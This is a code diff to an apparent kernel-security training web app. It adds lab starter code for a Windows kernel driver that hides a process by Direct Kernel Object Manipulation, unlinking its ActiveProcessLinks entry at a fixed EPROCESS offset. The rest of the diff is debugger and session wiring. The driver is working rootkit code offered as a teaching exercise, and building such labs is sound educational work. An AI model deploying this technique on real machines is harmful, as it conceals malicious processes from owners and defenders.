@@ -13,6 +13,50 @@ import { createDebugger } from "./debugger.js";
 const app = document.getElementById("app");
 let progress = emptyProgress();
 let currentDebugger = null;
+let currentKernel = null;
+
+function kernel_processByName(kernel, name) {
+  return kernel.processesByName.get(name) ?? null;
+}
+
+function getStarterCode(lab) {
+  if (lab.id.includes("dkom")) {
+    return `// DKOM process hiding — unlink kftarget.exe from ActiveProcessLinks
+//
+// This driver demonstrates Direct Kernel Object Manipulation:
+// 1. Locate the target _EPROCESS by PID
+// 2. Overwrite its ActiveProcessLinks to remove it from the list
+// 3. The process becomes invisible to !process / NtQuerySystemInformation
+
+#include <ntddk.h>
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    PEPROCESS targetProcess = NULL;
+    HANDLE targetPid = (HANDLE)666; // kftarget.exe
+
+    NTSTATUS status = PsLookupProcessByProcessId(targetPid, &targetProcess);
+    if (!NT_SUCCESS(status)) {
+        DbgPrint("DKOM: Failed to find pid %lu\\n", (ULONG)(ULONG_PTR)targetPid);
+        return status;
+    }
+
+    PLIST_ENTRY pLinks = (PLIST_ENTRY)((PUCHAR)targetProcess + 0x448);
+    RemoveEntryList(pLinks);
+    DbgPrint("DKOM: unlinked kftarget.exe, LIST_ENTRY @ %p\\n", pLinks);
+
+    ObDereferenceObject(targetProcess);
+    return STATUS_SUCCESS;
+}
+`;
+  }
+  return "// Write your driver code here\n";
+}
 
 async function persist() {
   await saveProgress(progress);
@@ -123,6 +167,7 @@ function renderLesson(lesson) {
             dumpWorld,
           });
           consoleOut.innerHTML = "";
+          currentKernel = session.kernel;
           currentDebugger = createDebugger(session.kernel, consoleOut);
           if (dumpWorld) {
             currentDebugger.write(
